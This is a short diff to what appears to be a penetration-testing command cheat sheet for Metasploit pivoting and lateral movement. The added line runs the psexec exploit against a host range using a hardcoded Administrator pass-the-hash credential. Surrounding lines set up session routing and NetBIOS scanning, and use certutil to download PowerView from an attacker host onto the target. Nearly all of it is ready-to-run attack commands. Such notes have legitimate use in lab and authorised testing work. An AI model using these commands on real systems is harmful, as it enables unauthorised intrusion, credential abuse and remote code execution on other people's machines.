@@ -389,6 +389,7 @@ sessions -i 1
 ipconfig
 run post/multi/manage/autoroute SUBNET=10.10.10.0 ACTION=add
 run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
+msfconsole -q -x "use exploit/windows/smb/psexec; set LHOST 10.10.10.3; set RHOSTS 10.10.10.1-3; set SMBUser Administrator; set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f; run"
 
 [*] Powerview
 powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
